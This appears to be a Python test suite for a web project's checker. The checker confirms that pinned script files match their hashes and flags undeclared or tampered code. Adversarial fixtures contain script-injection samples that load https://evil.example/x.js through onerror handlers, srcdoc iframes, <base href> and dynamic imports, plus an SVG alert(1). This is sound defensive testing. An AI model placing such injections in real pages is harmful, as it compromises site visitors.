#!/usr/bin/env python3
"""Shared pinned shell: shell/v*/ files match SHELL.json, the current release folder matches factory/,
and tools/shell_drift.py tells declared overrides/forks from drift. Offline; temp dirs only."""
import base64, hashlib, json, os, re, shutil, subprocess, sys, tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SHELL = os.path.join(ROOT, 'shell')
fails = []


def ok(cond, msg):
    print(('ok   ' if cond else 'FAIL ') + msg)
    if not cond:
        fails.append(msg)


def b(p):
    return open(p, 'rb').read()


rel = json.load(open(os.path.join(ROOT, 'FACTORY_RELEASE.json')))
for v in sorted(os.listdir(SHELL)):
    mp = os.path.join(SHELL, v, 'SHELL.json')
    if not os.path.isfile(mp):
        continue
    m = json.load(open(mp))
    ok(m['version'] == v, '%s: SHELL.json version matches folder' % v)
    ok(re.fullmatch(r'[0-9a-f]{40}', m['sourceCommit'] or '') is not None, '%s: sourceCommit is a full SHA' % v)
    for fn, meta in m['files'].items():
        data = b(os.path.join(SHELL, v, fn))
        ok(len(data) == meta['bytes'], '%s/%s bytes' % (v, fn))
        ok(hashlib.sha256(data).hexdigest() == meta['sha256'], '%s/%s sha256' % (v, fn))
        ok('sha384-' + base64.b64encode(hashlib.sha384(data).digest()).decode() == meta['integrity'], '%s/%s SRI sha384' % (v, fn))
    if v == rel['version']:
        for fn in m['files']:
            ok(b(os.path.join(SHELL, v, fn)) == b(os.path.join(ROOT, 'factory', fn)), '%s/%s == factory/%s (current release)' % (v, fn, fn))

# drift checker on synthetic rooms
m = json.load(open(os.path.join(SHELL, rel['version'], 'SHELL.json')))
V, SHA = rel['version'], '0' * 40
URL = 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@%s/shell/%s/factory.js' % (SHA, V)
INTEG = m['files']['factory.js']['integrity']
FB = '<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>'


def room(tmp, name, shell_tag, site_shell, files=None):
    d = os.path.join(tmp, name)
    os.makedirs(d)
    site = {'siteId': name, 'name': name}
    if site_shell is not None:
        site['shell'] = site_shell
    json.dump(site, open(os.path.join(d, 'site.json'), 'w'))
    open(os.path.join(d, 'index.html'), 'w').write('<html><body>%s%s</body></html>' % (FB, shell_tag))
    for k, v in (files or {}).items():
        open(os.path.join(d, k), 'wb').write(v)
    return d


def run(d):
    subprocess.run([sys.executable, os.path.join(ROOT, 'tools', 'shell_drift.py'), d, '--json', d + '.json'],
                         capture_output=True, text=True)
    return json.load(open(d + '.json'))[0]


pinned = '<script src="%s" integrity="%s" crossorigin="anonymous" data-site="site.json?v=1"></script>' % (URL, INTEG)
with tempfile.TemporaryDirectory() as t:
    ext = b"(window.__subxPlugins = window.__subxPlugins || []).push(function (core) { return {}; });\n"
    d = os.path.join(t, 'okroom')
    os.makedirs(os.path.join(d, 'ext'))
    open(os.path.join(d, 'ext', 'room.js'), 'wb').write(ext)
    open(os.path.join(d, 'styles.css'), 'w').write('')
    json.dump({'siteId': 'okroom', 'shell': {'base': V, 'fork': False, 'overrides': {
        'theme': ['styles.css'], 'copy': ['site.json:skin'],
        'modules': [{'file': 'ext/room.js', 'sha256': hashlib.sha256(ext).hexdigest(), 'hooks': ['__subxPlugins'], 'load': 'before', 'reason': 'test'}]}}},
        open(os.path.join(d, 'site.json'), 'w'))
    open(os.path.join(d, 'index.html'), 'w').write(FB + '<script src="ext/room.js?v=1"></script>' + pinned)
    r = run(d)
    ok(r['status'] == 'OK', 'pinned + declared theme/copy/module = OK (%s)' % r['findings'])

    r = run(room(t, 'nointeg', '<script src="%s" crossorigin="anonymous"></script>' % URL, {'base': V}))
    ok(r['status'] == 'DRIFT' and any('integrity' in x for x in r['findings']), 'pinned without SRI = DRIFT')

    r = run(room(t, 'floating', '<script src="https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@main/shell/%s/factory.js"></script>' % V, {'base': V}))
    ok(r['status'] == 'DRIFT', '@main (not a full SHA) = DRIFT')

    shell_bytes = b(os.path.join(ROOT, 'factory', 'factory.js'))
    forked = shell_bytes + b'// room fork\n'
    fsha = hashlib.sha256(forked).hexdigest()
    r = run(room(t, 'forkok', '<script src="factory.js?v=1"></script>',
                 {'base': V, 'fork': True, 'sha256': fsha, 'reason': 'test', 'exception': 'E0'}, {'factory.js': forked}))
    ok(r['status'] == 'FORK' and r['layers'].get('forkDiffLines') == 1, 'declared fork = FORK with diff size (%s)' % r)

    r = run(room(t, 'forkedit', '<script src="factory.js?v=1"></script>',
                 {'base': V, 'fork': True, 'sha256': fsha, 'reason': 'test', 'exception': 'E0'}, {'factory.js': forked + b'//x\n'}))
    ok(r['status'] == 'DRIFT' and any('undeclared edit' in x for x in r['findings']), 'edited fork (sha mismatch) = DRIFT')

    r = run(room(t, 'legacy', '<script src="factory.js?v=1"></script>', None, {'factory.js': shell_bytes}))
    ok(r['status'] == 'DRIFT', 'no shell block = DRIFT (legacy)')

    r = run(room(t, 'stale', pinned, {'base': V, 'fork': False}, {'factory.js': shell_bytes}))
    ok(r['status'] == 'DRIFT' and any('stale local' in x for x in r['findings']), 'pinned + leftover local copy = DRIFT')

    r = run(room(t, 'undeclared', pinned + '<script src="extra.js"></script>', {'base': V}, {'extra.js': b''}))
    ok(r['status'] == 'DRIFT' and any('undeclared local script' in x for x in r['findings']), 'undeclared module = DRIFT')

    gate = b'/* room gate */\n'
    r = run(room(t, 'kept', '<script src="gate.js?v=1"></script>' + pinned,
                 {'base': V, 'keep': [{'file': 'gate.js', 'sha256': hashlib.sha256(gate).hexdigest(), 'reason': 'E1'}]}, {'gate.js': gate}))
    ok(r['status'] == 'OK', 'room file in shell.keep (gate.js, sha256-pinned) = OK (%s)' % r['findings'])

    pre = 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@%s/factory/factory.js' % m['sourceCommit']
    r = run(room(t, 'premerge', '<script src="%s" integrity="%s" crossorigin="anonymous"></script>' % (pre, INTEG), {'base': V}))
    ok(r['status'] == 'OK', 'pre-merge factory/ path at SHELL.json sourceCommit = OK (%s)' % r['findings'])
    other = pre.replace(m['sourceCommit'], '1' * 40)
    r = run(room(t, 'premerge2', '<script src="%s" integrity="%s" crossorigin="anonymous"></script>' % (other, INTEG), {'base': V}))
    ok(r['status'] == 'DRIFT', 'factory/ path at any other commit = DRIFT')

# ---- Key 2 adversarial rooms (test/fixtures/shell_drift/adv, from the PR #28 Key 2 review): each must be DRIFT ----
ADV = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv')
ADV_EXPECT = {
    'a_inline': 'undeclared inline <script>',
    'b_singlequote': 'undeclared local script app.js',
    'g_unquoted': 'undeclared local script app.js',
    'c_commentedpin': 'no shell runs',
    'd_deep': 'a/b/page.html:1 loads undeclared local script factory-copy.js',
    'e_dynamic': 'at runtime',
    'f_keepmut': "keep entry 'gate.js' must be {file, sha256, reason}",
}
for name, needle in sorted(ADV_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name)
        shutil.copytree(os.path.join(ADV, name), d)
        r = run(d)
        ok(r['status'] == 'DRIFT' and any(needle in x for x in r['findings']),
           'adv %s = DRIFT with "%s" (%s)' % (name, needle, r['status']))


def sha(b_):
    return hashlib.sha256(b_).hexdigest()


def write(d, rel, data):
    p = os.path.join(d, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, 'wb' if isinstance(data, bytes) else 'w').write(data)


with tempfile.TemporaryDirectory() as t:
    # precision: the same rooms come out clean once the difference is declared
    d = os.path.join(t, 'b_declared'); shutil.copytree(os.path.join(ADV, 'b_singlequote'), d)
    json.dump({'siteId': 'b', 'shell': {'base': V, 'overrides': {'modules': [
        {'file': 'app.js', 'sha256': sha(b(os.path.join(d, 'app.js'))), 'hooks': ['__subxPlugins'], 'load': 'before', 'reason': 't'}]}}},
        open(os.path.join(d, 'site.json'), 'w'))
    r = run(d); ok(r['status'] == 'OK', 'single-quoted local src declared as module = OK (%s)' % r['findings'])

    d = os.path.join(t, 'a_declared'); shutil.copytree(os.path.join(ADV, 'a_inline'), d)
    html = open(os.path.join(d, 'index.html')).read()
    body = html.split('<script>', 1)[1].split('</script>', 1)[0]
    json.dump({'siteId': 'a', 'shell': {'base': V, 'overrides': {'inline': [{'page': 'index.html', 'sha256': sha(body.encode()), 'reason': 't'}]}}},
              open(os.path.join(d, 'site.json'), 'w'))
    r = run(d); ok(r['status'] == 'OK', 'inline <script> declared by page + sha256 = OK (%s)' % r['findings'])
    write(d, 'index.html', html.replace('window.evil=1', 'window.evil=2'))
    r = run(d); ok(r['status'] == 'DRIFT', 'declared inline script edited = DRIFT')

    d = os.path.join(t, 'c_declared'); shutil.copytree(os.path.join(ADV, 'c_commentedpin'), d)
    json.dump({'siteId': 'c', 'shell': {'base': V, 'overrides': {'modules': [
        {'file': 'app.js', 'sha256': sha(b(os.path.join(d, 'app.js'))), 'hooks': [], 'load': 'before', 'reason': 't'}]}}},
        open(os.path.join(d, 'site.json'), 'w'))
    r = run(d); ok(r['status'] == 'DRIFT' and r['findings'] == ['no pinned factory.js <script> on any page (no shell runs)'],
                   'commented-out pin with everything else declared = DRIFT, only "no shell runs" (%s)' % r['findings'])

    # nested page carrying its own real shell copy
    d = room(t, 'nested_copy', pinned, {'base': V})
    write(d, 'a/b/page.html', '<script src="factory.js"></script>')
    write(d, 'a/b/factory.js', b(os.path.join(ROOT, 'factory', 'factory.js')))
    r = run(d)
    ok(r['status'] == 'DRIFT' and any('a/b/page.html:1 loads local a/b/factory.js' in x for x in r['findings'])
       and any('a/b/factory.js is a shell copy' in x for x in r['findings']), 'nested page with its own shell copy = DRIFT (%s)' % r['findings'])

    # unreferenced shell copy with an edited body still carries the SubX factory header
    d = room(t, 'orphan_copy', pinned, {'base': V})
    write(d, 'old/f.js', b(os.path.join(ROOT, 'factory', 'factory.js'))[:2000] + b'\n// edited\n')
    r = run(d); ok(r['status'] == 'DRIFT' and any('old/f.js is a shell copy' in x for x in r['findings']), 'unreferenced edited shell copy = DRIFT')

    # runtime loads of a factory/shell file from declared room JS: DRIFT even with an "injects" reason
    for label, code in (('dynamic import()', "import('https://cdn.example/factory.js');\n"),
                        ('createElement script', "var s=document.createElement(\"script\");s.src='factory.js';document.head.appendChild(s);\n")):
        js = code.encode()
        d = room(t, 'dyn_' + label.split()[0], '<script src="ext.js"></script>' + pinned,
                 {'base': V, 'overrides': {'modules': [{'file': 'ext.js', 'sha256': sha(js), 'hooks': [], 'load': 'before', 'reason': 't', 'injects': 'declared'}]}},
                 {'ext.js': js})
        r = run(d); ok(r['status'] == 'DRIFT' and any('names a factory/shell file' in x for x in r['findings']),
                       'declared module doing %s of a shell file = DRIFT (%s)' % (label, r['findings']))
    js = b"var s=document.createElement('script');s.src='https://maps.example/x.js';document.head.appendChild(s);\n"
    d = room(t, 'inj_undeclared', '<script src="ext.js"></script>' + pinned,
             {'base': V, 'overrides': {'modules': [{'file': 'ext.js', 'sha256': sha(js), 'hooks': [], 'load': 'before', 'reason': 't'}]}}, {'ext.js': js})
    r = run(d); ok(r['status'] == 'DRIFT', 'module injecting a non-shell script without "injects" = DRIFT')
    d = room(t, 'inj_declared', '<script src="ext.js"></script>' + pinned,
             {'base': V, 'overrides': {'modules': [{'file': 'ext.js', 'sha256': sha(js), 'hooks': [], 'load': 'before', 'reason': 't', 'injects': 'map widget'}]}}, {'ext.js': js})
    r = run(d); ok(r['status'] == 'OK', 'module injecting a non-shell script with a declared "injects" reason = OK (%s)' % r['findings'])

    # keep files: sha256 pin enforced, and a keep file that is a shell copy is still DRIFT
    d = room(t, 'keep_edit', '<script src="gate.js"></script>' + pinned,
             {'base': V, 'keep': [{'file': 'gate.js', 'sha256': sha(b'one'), 'reason': 'E1'}]}, {'gate.js': b'two'})
    r = run(d); ok(r['status'] == 'DRIFT' and any('keep gate.js sha256 differs' in x for x in r['findings']), 'keep file edited after pin = DRIFT')
    shell_bytes = b(os.path.join(ROOT, 'factory', 'factory.js'))
    d = room(t, 'keep_shell', '<script src="gate.js"></script>' + pinned,
             {'base': V, 'keep': [{'file': 'gate.js', 'sha256': sha(shell_bytes), 'reason': 'E1'}]}, {'gate.js': shell_bytes})
    r = run(d); ok(r['status'] == 'DRIFT' and any('gate.js is a shell copy' in x for x in r['findings']), 'keep file that is a shell copy = DRIFT')

    # third-party: emoji-picker@1 without SRI is WARN (not OK, not DRIFT); exact version + integrity is clean
    d = room(t, 'emoji_warn', pinned + '<script type="module" src="https://cdn.jsdelivr.net/npm/emoji-picker-element@1/index.js"></script>', {'base': V})
    r = run(d); ok(r['status'] == 'WARN' and r['warnings'], 'emoji-picker-element@1 without SRI = WARN')
    d = room(t, 'emoji_pinned', pinned + '<script type="module" src="https://cdn.jsdelivr.net/npm/emoji-picker-element@1.21.3/index.js" integrity="sha384-x" crossorigin="anonymous"></script>', {'base': V})
    r = run(d); ok(r['status'] == 'OK', 'emoji-picker-element exact version + integrity = OK')

    # no fallback host: fastly mirror is not a declared pin
    d = room(t, 'fastly', pinned.replace('cdn.jsdelivr.net', 'fastly.jsdelivr.net'), {'base': V})
    r = run(d); ok(r['status'] == 'DRIFT', 'fastly.jsdelivr.net host (no failover loader exists) = DRIFT')

    # data scripts are not code
    d = room(t, 'ldjson', pinned + '<script type="application/ld+json">{"@type":"WebSite"}</script>', {'base': V})
    r = run(d); ok(r['status'] == 'OK', 'application/ld+json data block = OK')

# ---- C6: Key 2 re-review bypass rooms (test/fixtures/shell_drift/adv2, built by its mk.py) ----
ADV2 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv2')
ADV2_EXPECT = {  # room: (status, finding needle, warning needle)
    'h0_control': ('OK', None, None),
    'w_emoji': ('WARN', None, 'emoji-picker-element@1 has no SRI'),
    'h1_upper': ('DRIFT', 'undeclared local script app.js', None),
    'h2_data': ('DRIFT', 'undeclared remote script data:', None),
    'h3_srcdoc': ('DRIFT', 'undeclared <iframe srcdoc>', None),
    'h4_base': ('DRIFT', '<base href=', None),
    'h5_modimport': ('DRIFT', 'ext/room.js statically imports https://evil.example/x.js', None),
    'h5b_inlinemod': ('DRIFT', 'inline statically imports https://evil.example/x.js', None),
    'h6_extrabefore': ('DRIFT', 'undeclared local script pre.js', None),
    'h7_onerror': ('DRIFT', 'undeclared <img onerror=>', None),
    'h8_inertpin': ('DRIFT', 'pin is inert (type=text/plain)', None),
    'h9_templatepin': ('DRIFT', 'pin is inert (inside <template>)', None),
    'h10_evalfetch': ('DRIFT', 'at runtime (', None),
    'h11_obf': ('DRIFT', 'at runtime (createElement(t', None),
    'h12_iframe': ('DRIFT', 'undeclared <a href=javascript:>', 'remote <iframe src=https://evil.example/page.html>'),
    'h13_worker': ('DRIFT', 'at runtime (new Worker(', None),
    'h14_nomodule': ('DRIFT', 'pin is inert (nomodule)', None),
    'h15_php': ('DRIFT', 'page.php:1 loads undeclared local script factory-copy.js', None),
}
ok(sorted(ADV2_EXPECT) == sorted(x for x in os.listdir(ADV2) if os.path.isdir(os.path.join(ADV2, x))), 'every adv2 fixture room has an expectation')


def adv2(t, name, new=None):
    d = os.path.join(t, new or name)
    shutil.copytree(os.path.join(ADV2, name), d)
    return d


def reshell(d, fn):
    s = json.load(open(os.path.join(d, 'site.json')))
    fn(s['shell'])
    json.dump(s, open(os.path.join(d, 'site.json'), 'w'))


for name, (st, needle, wneedle) in sorted(ADV2_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        r = run(adv2(t, name))
        good = r['status'] == st and (needle is None or any(needle in x for x in r['findings'])) \
            and (wneedle is None or any(wneedle in x for x in r['warnings']))
        ok(good, 'adv2 %s = %s%s (%s %s %s)' % (name, st, ' with "%s"' % needle if needle else '', r['status'], r['findings'], r['warnings']))

with tempfile.TemporaryDirectory() as t:
    def page(d):
        return open(os.path.join(d, 'index.html')).read()

    def put(d, html):
        open(os.path.join(d, 'index.html'), 'w').write(html)

    def ov(d, key, entries):
        reshell(d, lambda sh: sh.setdefault('overrides', {}).setdefault(key, []).extend(entries))

    def mod(d, **kw):
        reshell(d, lambda sh: [e.update(kw) for e in sh['overrides']['modules']])

    # h3: srcdoc declared by sha256 in overrides.frames = OK
    d = adv2(t, 'h3_srcdoc', 'h3_decl')
    sd = '<script src="https://evil.example/x.js"></script>'
    ov(d, 'frames', [{'page': 'index.html', 'sha256': sha(sd.encode()), 'reason': 't'}])
    r = run(d); ok(r['status'] == 'OK', 'srcdoc declared in overrides.frames = OK (%s)' % r['findings'])
    # h4: <base> cannot be declared; without it the same room is OK; <base target> alone is fine
    d = adv2(t, 'h4_base', 'h4_nobase'); put(d, page(d).replace('<base href="https://evil.example/">', '<base target="_blank">'))
    r = run(d); ok(r['status'] == 'OK', 'same room with <base target> only (no href) = OK (%s)' % r['findings'])
    # h5: remote static import listed in the module's "imports" = OK
    d = adv2(t, 'h5_modimport', 'h5_decl'); mod(d, imports=['https://evil.example/x.js'])
    r = run(d); ok(r['status'] == 'OK', 'static remote import listed in module "imports" = OK (%s)' % r['findings'])
    # h5b: inline module declared with its import listed = OK
    d = adv2(t, 'h5b_inlinemod', 'h5b_decl')
    ov(d, 'inline', [{'page': 'index.html', 'sha256': sha(b'import "https://evil.example/x.js"'), 'reason': 't', 'imports': ['https://evil.example/x.js']}])
    r = run(d); ok(r['status'] == 'OK', 'declared inline module with its import listed = OK (%s)' % r['findings'])
    # h7: handler declared without "injects" still flags the injection; with "injects" = OK
    d = adv2(t, 'h7_onerror', 'h7_decl')
    hv = "var s=document.createElement('script');s.src='https://evil.example/x.js';document.head.appendChild(s)"
    ov(d, 'inline', [{'page': 'index.html', 'sha256': sha(hv.encode()), 'reason': 't'}])
    r = run(d); ok(r['status'] == 'DRIFT' and all('undeclared' not in x for x in r['findings']), 'declared on*= handler that injects, no "injects" = DRIFT (injection only)')
    reshell(d, lambda sh: sh['overrides']['inline'][0].update(injects='t'))
    r = run(d); ok(r['status'] == 'OK', 'declared on*= handler with "injects" = OK (%s)' % r['findings'])
    # h8/h9/h14: a pin that runs (type=module) = OK; a pin inside <noscript> = DRIFT
    d = adv2(t, 'h8_inertpin', 'h8_module'); put(d, page(d).replace('type="text/plain"', 'type="module"'))
    r = run(d); ok(r['status'] == 'OK', 'pin with type="module" counts = OK (%s)' % r['findings'])
    d = adv2(t, 'h9_templatepin', 'h9_noscript'); put(d, page(d).replace('template>', 'noscript>'))
    r = run(d); ok(r['status'] == 'DRIFT' and any('inside <noscript>' in x for x in r['findings']), 'pin inside <noscript> = DRIFT')
    d = adv2(t, 'h9_templatepin', 'h9_out'); put(d, page(d).replace('<template>', '').replace('</template>', ''))
    r = run(d); ok(r['status'] == 'OK', 'same pin outside <template> = OK')
    d = adv2(t, 'h0_control', 'dupsrc'); put(d, page(d).replace('<script src="https://cdn', '<script src="ext/x.js" src="https://cdn'))
    r = run(d); ok(r['status'] == 'DRIFT' and any('duplicated attributes' in x for x in r['findings']), 'pin tag with a duplicated src (browser uses the first) = DRIFT')
    # h10/h11/h13: best-effort injection hits clear with a declared "injects" reason
    for n in ('h10_evalfetch', 'h11_obf', 'h13_worker'):
        d = adv2(t, n, n + '_decl'); mod(d, injects='reviewed')
        r = run(d); ok(r['status'] == 'OK', '%s with declared "injects" = OK (%s)' % (n, r['findings']))
    # h12: frame and javascript: URL both declared = OK; remote iframe alone = WARN
    d = adv2(t, 'h12_iframe', 'h12_decl')
    ov(d, 'frames', [{'page': 'index.html', 'src': 'https://evil.example/page.html', 'reason': 't'}])
    ov(d, 'inline', [{'page': 'index.html', 'sha256': sha(b'javascript:void(0)'), 'reason': 't'}])
    r = run(d); ok(r['status'] == 'OK', 'remote iframe + javascript: URL both declared = OK (%s %s)' % (r['findings'], r['warnings']))
    d = adv2(t, 'h12_iframe', 'h12_warn'); put(d, page(d).replace('<a href="javascript:void(0)">x</a>', ''))
    r = run(d); ok(r['status'] == 'WARN' and not r['findings'], 'undeclared remote iframe alone = WARN')
    d = adv2(t, 'h0_control', 'frames_bad')
    put(d, page(d).replace('<script src="ext', '<iframe src="data:text/html,x"></iframe><object data="x.swf"></object><script src="ext'))
    r = run(d); ok(r['status'] == 'DRIFT' and any('data source' in x for x in r['findings']) and any('undeclared <object>' in x for x in r['findings']),
                   'data: iframe and undeclared <object> = DRIFT')
    # h15: the php page with its script declared and present = OK
    d = adv2(t, 'h15_php', 'h15_decl'); fc = b'window.x=1;\n'; write(d, 'factory-copy.js', fc)
    reshell(d, lambda sh: sh.setdefault('keep', []).append({'file': 'factory-copy.js', 'sha256': sha(fc), 'reason': 't'}))
    r = run(d); ok(r['status'] == 'OK', 'php page script declared in keep = OK (%s)' % r['findings'])
    # svg pages are scanned too
    d = adv2(t, 'h0_control', 'svg'); write(d, 'img/x.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')
    r = run(d); ok(r['status'] == 'DRIFT' and any('img/x.svg' in x for x in r['findings']), 'script inside a room .svg = DRIFT')
    # static local imports: target must be declared; once declared = OK; a static import of a shell file = DRIFT
    d = adv2(t, 'h0_control', 'locimp')
    m1 = b"import './util.js';\n" + b(os.path.join(d, 'ext', 'room.js')); write(d, 'ext/room.js', m1); write(d, 'ext/util.js', b'export const x = 1;\n')
    mod(d, sha256=sha(m1))
    r = run(d); ok(r['status'] == 'DRIFT' and any('imports undeclared local module ext/util.js' in x for x in r['findings']), 'static import of an undeclared local module = DRIFT')
    ov(d, 'modules', [{'file': 'ext/util.js', 'sha256': sha(b'export const x = 1;\n'), 'hooks': [], 'load': 'import', 'reason': 't'}])
    r = run(d); ok(r['status'] == 'OK', 'same import once ext/util.js is declared = OK (%s)' % r['findings'])
    m2 = b"import 'https://cdn.jsdelivr.net/gh/x/subx-factory@main/factory/factory.js';\n"; write(d, 'ext/util.js', m2)
    reshell(d, lambda sh: [e.update(sha256=sha(m2), imports=['https://cdn.jsdelivr.net/gh/x/subx-factory@main/factory/factory.js'])
                           for e in sh['overrides']['modules'] if e['file'] == 'ext/util.js'])
    r = run(d); ok(r['status'] == 'DRIFT' and any('statically imports a factory/shell file' in x for x in r['findings']), 'static import of a shell file (even if listed) = DRIFT')

print('\n%d failure(s)' % len(fails))
sys.exit(1 if fails else 0)
